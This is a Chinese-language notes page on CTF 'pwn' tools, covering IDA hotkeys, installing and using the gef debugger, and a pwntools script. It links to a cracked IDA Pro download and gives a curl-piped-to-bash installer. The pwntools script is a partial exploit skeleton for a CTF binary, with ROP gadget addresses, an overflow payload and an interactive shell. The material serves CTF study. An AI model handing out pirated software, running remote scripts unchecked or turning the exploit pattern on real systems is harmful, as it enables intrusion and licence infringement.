# PWN工具

## 工具

### IDA

#### 下载

 [IDA_pro_7.7_crack](htps://share.weiyun.com/WDc50Ohn)

#### 使用

代码区、工具区、函数区

|   快捷键    |             功能             |
| :---------: | :--------------------------: |
|  Shift+F12  |          查看字符串          |
|    Space    |        源码/流图 切换        |
|      a      |         切换为字符串         |
|      d      | 切换为data(byte, word, ...)  |
|      g      |          跳转至地址          |
| 右键->Array |           定义数组           |
|   Shift+E   |           导出数据           |
|      ;      |             注释             |
|     F5      |            反编译            |
|      n      |      修改函数名、变量名      |
|      y      | 修改变量类型、函数返回值类型 |
|      /      |             注释             |
|      x      |         查看函数调用         |

（更多功能在实战中探索...）

### gef

#### 下载

1. 快速下载

   要求：GDB 8.0+  python 3.6+ 

   ```sh
   bash -c "$(curl -fsSL https://gef.blah.cat/sh)"
   # 或
   bash -c "$(wget https://gef.blah.cat/sh -O -)"
   ```

   查看 `~/.gdbinit` 如果有 source ~/.\*gef\*.py 说明安装成功

   ```sh
   cat ~/.gdbinit 
   source ~/.gef.py
   ```

2. Git下载

   ```sh
   git clone https://github.com/hugsy/gef.git
   echo source `pwd`/gef/gef.py >> ~/.gdbinit
   ```

#### 使用

直接执行 `gdb <filename>`

```sh
$ gdb bin

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 13.1 in 0.00ms using Python engine 3.11
Reading symbols from bin...
(No debugging symbols found in bin)
gef➤  
```

|            命令            |             功能             |
| :------------------------: | :--------------------------: |
|        aslr on/off         |        开启/关闭aslr         |
|           start            |           启动调试           |
|         b * [addr]         |        在addr处下断点        |
|           info b           |   查看所有断点（对应标号）   |
|        d [断点标号]        |           删去断点           |
|             c              |        执行到下个断点        |
|           ni [n]           |       执行一(n)个指令        |
|             n              | 执行单行代码（带源码情况下） |
|    x/[size+type] [addr]    |         查看地址内容         |
|          context           |       界面展示指定内容       |
|           define           |          自定义命令          |
|         gef config         |             配置             |
|         stack [n]          |       查看栈上n行信息        |
| heap [chunks\|bins\|arena] |          查看堆信息          |

> 更多GDB基础命令：https://visualgdb.com/gdbreference/commands/
>
> 更多GEF实用命令：https://hugsy.github.io/gef/commands/aliases/

### pwntools

#### 下载

```sh
pip3 install pwntools
```

#### 使用

```python
from pwn import *
context.log_level='debug'	# 详细调试信息

filename = './shellwego'
proc = process(filename)	# 进程
belf = ELF(filename)		# ELF信息

gscript = '''
    b * 0x0000000004C1882
    c
'''	# gdb命令
gdb.attach(proc, gdbscript=gscript)	# 挂载到gdb上调试

poprdi_ret = 0x444fec
poprsi_ret = 0x41e818
poprdx_ret = 0x49e11d
poprax_ret = 0x40d9e6
syscall = 0x40328c

proc.sendlineafter(b'ciscnshell$ ', b'cert nAcDsMicN S33UAga1n@#!')		# 在接收到arg1之后发送arg2并换行

payload = b'echo '+b'h'*0x100+b' '+b'h'*0x103

proc.sendlineafter(b'# ', payload)
proc.send(b"/bin/sh\x00")	# 发送
res = proc.recv()		# 接收
proc.recvuntil(b'hhh')	# 一直接收直到遇见arg1
proc.interactive()		# 互动shell
pause()			# 暂停程序（gdb调试需要）
```

> 使用文档：https://docs.pwntools.com/en/stable/about.html

# 